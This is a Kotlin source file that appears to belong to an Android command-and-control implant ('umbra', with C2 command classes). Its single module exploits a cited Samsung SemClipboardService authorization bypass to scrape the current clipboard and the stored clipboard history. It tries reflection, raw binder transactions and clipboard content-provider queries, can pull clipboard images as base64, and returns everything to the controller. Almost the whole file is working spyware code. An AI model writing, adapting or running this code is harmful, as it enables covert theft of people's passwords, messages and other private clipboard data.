package dev.yassine.umbra.modules

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Binder
import android.os.IBinder
import android.os.Parcel
import android.util.Base64
import android.util.Log
import dev.yassine.umbra.c2.Command
import dev.yassine.umbra.c2.CommandResult
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.ByteArrayOutputStream
import java.lang.reflect.Method

/**
 * SVE-2026-0916 / CVE-2026-21062: SemClipboardService Authorization Bypass
 *
 * Samsung's SemClipboardService allows unprivileged local apps to access
 * clipboard data (including full clipboard history) without proper authorization.
 * Patched in SMR Aug-2026 Release 1; vulnerable on July 2026 patch level.
 *
 * This module uses multiple fallback approaches to scrape the Samsung clipboard:
 *   1. Reflection into SemClipboardManager (Samsung's enhanced ClipboardManager)
 *   2. Direct binder call to IClipboardService via ServiceManager
 *   3. ContentProvider query on com.sec.android.semclipboardprovider
 *   4. Standard Android ClipboardManager (fallback; Samsung wraps this anyway)
 */
object ClipboardModule {

    private const val TAG = "Umbra.Clipboard"
    private val json = Json { prettyPrint = false }

    // ---------------------------------------------------------------------------
    // Public entry point – called by CommandDispatcher
    // ---------------------------------------------------------------------------
    suspend fun scrape(context: Context, cmd: Command): String = withContext(Dispatchers.IO) {
        val action = cmd.params["action"] ?: "all"
        val count = (cmd.params["count"] ?: "50").toIntOrNull() ?: 50

        try {
            val entries = when (action) {
                "latest" -> listOfNotNull(scrapeLatest(context))
                "history" -> scrapeHistory(context, count)
                "watch"  -> listOf(mapOf("status" to "watch_started", "message" to "use standard ClipboardManager.OnPrimaryClipChangedListener"))
                else     -> {
                    // "all": get latest + try to get history
                    val latest = scrapeLatest(context)
                    val history = scrapeHistory(context, count)
                    if (latest != null) listOf(latest) + history else history
                }
            }

            val result = mapOf<String, String>(
                "clipboard_provider" to "Samsung SemClipboardService",
                "vulnerability" to "SVE-2026-0916 (CVE-2026-21062)",
                "entry_count" to entries.size.toString(),
                "entries" to entries.toString()  // convert to string via toString()
            )

            json.encodeToString(CommandResult.serializer(),
                CommandResult(cmd.cmd_id, "ok", json.encodeToString(result)))

        } catch (e: Exception) {
            Log.e(TAG, "Clipboard scrape failed: ${e.message}", e)
            json.encodeToString(CommandResult.serializer(),
                CommandResult(cmd.cmd_id, "error", "", "clipboard:${e.message}"))
        }
    }

    // ---------------------------------------------------------------------------
    // Approach 1: Reflection into SemClipboardManager
    // ---------------------------------------------------------------------------
    private fun scrapeViaSemClipboardManager(context: Context): Map<String, String>? {
        return try {
            // Samsung's SemClipboardManager wraps the system ClipboardManager
            // On Samsung One UI, getSystemService(CLIPBOARD_SERVICE) returns a
            // SemClipboardManager instance. We can access extended methods via reflection.
            val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager

            // Try to call SemClipboardManager-specific methods via reflection
            val semCmClass = try {
                Class.forName("com.samsung.android.content.clipboard.SemClipboardManager")
            } catch (_: ClassNotFoundException) {
                Class.forName("android.sec.clipboard.IClipboardService")
            }

            // Method 1a: getLatestClip() on SemClipboardManager
            val getLatestClipMethod = try {
                semCmClass.getDeclaredMethod("getLatestClip")
            } catch (_: NoSuchMethodException) {
                null
            }

            if (getLatestClipMethod != null) {
                getLatestClipMethod.isAccessible = true
                val clipData = getLatestClipMethod.invoke(cm) as? ClipData
                if (clipData != null && clipData.itemCount > 0) {
                    return clipDataToMap(clipData, 0)
                }
            }

            // Method 1b: getClipData() - returns all clipboard history
            val getClipDataMethod = try {
                semCmClass.getDeclaredMethod("getClipData")
            } catch (_: NoSuchMethodException) {
                try {
                    semCmClass.getDeclaredMethod("getAllClips")
                } catch (_: NoSuchMethodException) {
                    null
                }
            }

            if (getClipDataMethod != null) {
                getClipDataMethod.isAccessible = true
                val result = getClipDataMethod.invoke(cm)
                if (result is ClipData && result.itemCount > 0) {
                    return clipDataToMap(result, 0)
                }
                // Might return List<ClipData>
                if (result is List<*>) {
                    val first = result.firstOrNull()
                    if (first is ClipData && first.itemCount > 0) {
                        return clipDataToMap(first, 0)
                    }
                }
            }

            null
        } catch (e: Exception) {
            Log.d(TAG, "SemClipboardManager reflection failed: ${e.message}")
            null
        }
    }

    // ---------------------------------------------------------------------------
    // Approach 2: Direct binder call to IClipboardService
    // ---------------------------------------------------------------------------
    private fun scrapeViaBinderService(context: Context): Map<String, String>? {
        return try {
            // On Samsung, the clipboard service is registered under "clipboard"
            // The IClipboardService AIDL is in android.sec.clipboard
            val serviceManagerClass = Class.forName("android.os.ServiceManager")
            val getServiceMethod: Method = serviceManagerClass.getDeclaredMethod(
                "getService", String::class.java
            )
            getServiceMethod.isAccessible = true

            // Try multiple service names
            val serviceNames = listOf("clipboard", "semclipboard", "sec.clipboard", "SemClipboardService")
            var binder: IBinder? = null

            for (name in serviceNames) {
                try {
                    binder = getServiceMethod.invoke(null, name) as? IBinder
                    if (binder != null) {
                        Log.d(TAG, "Found clipboard binder service: $name")
                        break
                    }
                } catch (_: Exception) { }
            }

            if (binder == null) return null

            // Call getClipData() via raw binder transaction
            // IClipboardService.Stub.TRANSACTION_getClipData (varies by AIDL)
            val data = Parcel.obtain()
            val reply = Parcel.obtain()
            try {
                val token = Binder.clearCallingIdentity()
                try {
                    data.writeInterfaceToken("android.sec.clipboard.IClipboardService")
                    // TRANSACTION_getClipData is typically 2 or 3 in Samsung's AIDL
                    for (txCode in listOf(1, 2, 3, 4, 5)) {
                        try {
                            data.setDataPosition(0)
                            reply.setDataPosition(0)
                            val ok = binder.transact(txCode, data, reply, 0)
                            if (ok) {
                                reply.readException()
                                val clipCount = reply.readInt()
                                if (clipCount > 0) {
                                    reply.readString() // description
                                    val text = reply.readString()
                                    if (!text.isNullOrBlank()) {
                                        return mapOf(
                                            "index" to "0",
                                            "text" to text,
                                            "timestamp" to System.currentTimeMillis().toString(),
                                            "method" to "binder_transaction_$txCode"
                                        )
                                    }
                                }
                            }
                        } catch (_: Exception) { }
                    }
                } finally {
                    Binder.restoreCallingIdentity(token)
                }
            } finally {
                data.recycle()
                reply.recycle()
            }
            null
        } catch (e: Exception) {
            Log.d(TAG, "Binder service approach failed: ${e.message}")
            null
        }
    }

    // ---------------------------------------------------------------------------
    // Approach 3: ContentProvider query on SemClipboardProvider
    // ---------------------------------------------------------------------------
    private fun scrapeViaContentProvider(context: Context): List<Map<String, String>> {
        val entries = mutableListOf<Map<String, String>>()

        // Samsung's clipboard content provider URIs
        val providerUris = listOf(
            Uri.parse("content://com.sec.android.semclipboardprovider"),
            Uri.parse("content://com.sec.android.semclipboardprovider/images"),
            Uri.parse("content://com.sec.android.semclipboardprovider/clips"),
            Uri.parse("content://com.sec.android.semclipboardprovider/data"),
            // On newer Samsung devices, clipboard may be in honeyboard (Samsung Keyboard)
            Uri.parse("content://com.samsung.android.honeyboard.icecone.provider.RichcontentProvider"),
            Uri.parse("content://com.samsung.android.honeyboard.icecone.provider.RichcontentProvider/clips")
        )

        for (uri in providerUris) {
            try {
                val token = Binder.clearCallingIdentity()
                try {
                    val cursor: Cursor? = context.contentResolver.query(
                        uri, null, null, null, null
                    )
                    cursor?.use {
                        val columns = it.columnNames
                        Log.d(TAG, "Found clipboard provider: $uri cols=${columns.joinToString(",")}")
                        var rowIdx = 0
                        while (it.moveToNext() && rowIdx < 100) {
                            val row = mutableMapOf<String, String>()
                            row["provider_uri"] = uri.toString()
                            row["row_index"] = rowIdx.toString()
                            for (col in columns) {
                                try {
                                    val colIdx = it.getColumnIndex(col)
                                    if (colIdx >= 0) {
                                        val value = when {
                                            it.getType(colIdx) == Cursor.FIELD_TYPE_BLOB -> {
                                                val blob = it.getBlob(colIdx)
                                                "[BLOB ${blob.size} bytes]"
                                            }
                                            else -> it.getString(colIdx) ?: ""
                                        }
                                        row[col] = value
                                    }
                                } catch (_: Exception) { }
                            }
                            entries.add(row)
                            rowIdx++
                        }
                    }
                    if (entries.isNotEmpty()) break // Use first successful provider
                } catch (se: SecurityException) {
                    Log.d(TAG, "Provider $uri requires permission (expected pre-patch behavior): ${se.message}")
                    // On unpatched devices, this should succeed without exception
                } finally {
                    Binder.restoreCallingIdentity(token)
                }
            } catch (e: Exception) {
                Log.d(TAG, "Provider $uri not accessible: ${e.message}")
            }
        }

        return entries
    }

    // ---------------------------------------------------------------------------
    // Approach 4: Standard Android ClipboardManager (works on Samsung)
    // ---------------------------------------------------------------------------
    private fun scrapeViaStandardClipboard(context: Context): Map<String, String>? {
        return try {
            val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                clipDataToMap(clip, 0).toMutableMap().apply {
                    put("method", "standard_clipboard_manager")
                }
            } else null
        } catch (e: Exception) {
            Log.d(TAG, "Standard clipboard failed: ${e.message}")
            null
        }
    }

    // ---------------------------------------------------------------------------
    // Orchestration helpers
    // ---------------------------------------------------------------------------
    private fun scrapeLatest(context: Context): Map<String, String>? {
        // Try multiple approaches in order of effectiveness
        return scrapeViaSemClipboardManager(context)
            ?: scrapeViaBinderService(context)
            ?: scrapeViaStandardClipboard(context)
    }

    private fun scrapeHistory(context: Context, maxCount: Int): List<Map<String, String>> {
        val entries = mutableListOf<Map<String, String>>()

        // Try content provider first (gives history)
        val providerEntries = scrapeViaContentProvider(context)
        entries.addAll(providerEntries.take(maxCount))

        // Supplement with SemClipboardManager history
        if (entries.size < maxCount) {
            try {
                val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val semCmClass = try {
                    Class.forName("com.samsung.android.content.clipboard.SemClipboardManager")
                } catch (_: ClassNotFoundException) { null }

                if (semCmClass != null) {
                    // Try getClipData (returns all history)
                    for (methodName in listOf("getClipData", "getAllClips", "getClipboardHistory")) {
                        try {
                            val m = semCmClass.getDeclaredMethod(methodName)
                            m.isAccessible = true
                            val result = m.invoke(cm)
                            when (result) {
                                is ClipData -> {
                                    if (result.itemCount > 0) {
                                        entries.add(clipDataToMap(result, entries.size))
                                    }
                                }
                                is List<*> -> {
                                    for ((i, item) in result.withIndex()) {
                                        if (entries.size >= maxCount) break
                                        if (item is ClipData && item.itemCount > 0) {
                                            entries.add(clipDataToMap(item, i))
                                        }
                                    }
                                }
                                is Array<*> -> {
                                    for ((i, item) in result.withIndex()) {
                                        if (entries.size >= maxCount) break
                                        if (item is ClipData && item.itemCount > 0) {
                                            entries.add(clipDataToMap(item, i))
                                        }
                                    }
                                }
                            }
                            break // Stop on first successful method
                        } catch (_: Exception) { }
                    }
                }
            } catch (e: Exception) {
                Log.d(TAG, "History via SemClipboardManager failed: ${e.message}")
            }
        }

        // If still empty, add the latest from standard clipboard
        if (entries.isEmpty()) {
            val latest = scrapeViaStandardClipboard(context)
            if (latest != null) entries.add(latest)
        }

        return entries
    }

    // ---------------------------------------------------------------------------
    // Utility: extract data from ClipData
    // ---------------------------------------------------------------------------
    private fun clipDataToMap(clip: ClipData, index: Int): Map<String, String> {
        val map = mutableMapOf<String, String>()
        map["index"] = index.toString()
        map["description"] = clip.description.label?.toString() ?: ""

        for (i in 0 until clip.itemCount) {
            val item = clip.getItemAt(i)
            val prefix = if (clip.itemCount > 1) "item_${i}_" else ""

            // Try to extract text
            val text = item.text?.toString()
                ?: item.htmlText?.toString()
            if (!text.isNullOrBlank()) {
                map["${prefix}text"] = text
            }

            // Try to extract HTML
            val html = item.htmlText
            if (!html.isNullOrBlank() && html != text) {
                map["${prefix}html"] = html
            }

            // Try to extract URI
            val uri = item.uri
            if (uri != null) {
                map["${prefix}uri"] = uri.toString()
            }

            // Try to extract intent
            val intent = item.intent
            if (intent != null) {
                map["${prefix}intent"] = intent.toUri(0)
            }

            // Try image (extract bytes)
            if (uri != null && (uri.toString().startsWith("content://") ||
                        map.containsKey("${prefix}uri"))) {
                map["${prefix}has_content_uri"] = "true"
                // Don't auto-fetch to avoid large payloads; caller can use read_image
            }
        }

        map["mime_type"] = clip.description.getMimeType(0) ?: "unknown"
        map["item_count"] = clip.itemCount.toString()
        map["timestamp"] = System.currentTimeMillis().toString()
        map["method"] = map["method"] ?: "semclipboard_reflection"

        return map
    }

    // ---------------------------------------------------------------------------
    // Public: read a specific clipboard image via content URI
    // ---------------------------------------------------------------------------
    suspend fun readImage(context: Context, cmd: Command): String = withContext(Dispatchers.IO) {
        val uriStr = cmd.params["uri"] ?: return@withContext json.encodeToString(
            CommandResult.serializer(),
            CommandResult(cmd.cmd_id, "error", "", "missing_uri")
        )

        try {
            val uri = Uri.parse(uriStr)
            val input = context.contentResolver.openInputStream(uri)
            val bytes = input?.use { stream ->
                val bos = ByteArrayOutputStream()
                stream.copyTo(bos)
                bos.toByteArray()
            } ?: ByteArray(0)

            if (bytes.isNotEmpty()) {
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                json.encodeToString(CommandResult.serializer(),
                    CommandResult(cmd.cmd_id, "ok", b64))
            } else {
                json.encodeToString(CommandResult.serializer(),
                    CommandResult(cmd.cmd_id, "error", "", "empty_content"))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Image read failed: ${e.message}")
            json.encodeToString(CommandResult.serializer(),
                CommandResult(cmd.cmd_id, "error", "", "clipboard_image:${e.message}"))
        }
    }
}
